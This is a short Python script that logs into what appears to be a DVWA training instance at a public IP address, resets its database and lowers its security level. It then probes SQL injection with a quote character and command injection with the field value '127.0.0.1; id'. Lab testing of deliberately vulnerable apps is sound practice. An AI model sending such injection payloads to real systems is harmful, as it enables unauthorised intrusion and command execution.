import httpx
import asyncio

async def test():
    async with httpx.AsyncClient(timeout=10, follow_redirects=True) as client:
        # 登录
        r = await client.post('http://47.95.192.41:8081/login.php', 
            data={'username': 'admin', 'password': 'password', 'Login': 'Login'})
        print(f'Login: {r.status_code}')
        
        # 初始化数据库
        r = await client.get('http://47.95.192.41:8081/setup.php')
        print(f'Setup page: {r.status_code}')
        
        # 点击创建数据库
        r = await client.post('http://47.95.192.41:8081/setup.php',
            data={'create_db': 'Create / Reset Database'})
        print(f'Create DB: {r.status_code}')
        
        # 重新登录
        r = await client.post('http://47.95.192.41:8081/login.php', 
            data={'username': 'admin', 'password': 'password', 'Login': 'Login'})
        
        # 设置安全等级
        r = await client.get('http://47.95.192.41:8081/security.php?security=low&seclev_submit=Submit')
        print(f'Security: {r.status_code}')
        
        # 现在测试 SQLi
        print("\n=== SQLi Test ===")
        r = await client.get("http://47.95.192.41:8081/vulnerabilities/sqli/?id=1")
        print(f'Normal: {r.status_code}, len={len(r.text)}, url={r.url}')
        
        r = await client.get("http://47.95.192.41:8081/vulnerabilities/sqli/?id=1'")
        print(f'Inject: {r.status_code}, len={len(r.text)}')
        
        if 'error' in r.text.lower() or 'syntax' in r.text.lower():
            import re
            m = re.search(r'(error in your SQL syntax[^<]{0,200})', r.text, re.I)
            if m:
                print(f'SQL Error found!')
                print(f'{m.group(1)[:100]}')
        
        # CMDi 测试
        print("\n=== CMDi Test ===")
        r = await client.post('http://47.95.192.41:8081/vulnerabilities/exec/',
            data={'ip': '127.0.0.1; id', 'Submit': 'Submit'})
        print(f'Status: {r.status_code}, len={len(r.text)}')
        
        if 'uid=' in r.text:
            import re
            m = re.search(r'(uid=\d+[^<\n]{0,100})', r.text)
            if m:
                print(f'CMDi found: {m.group(1)}')

asyncio.run(test())
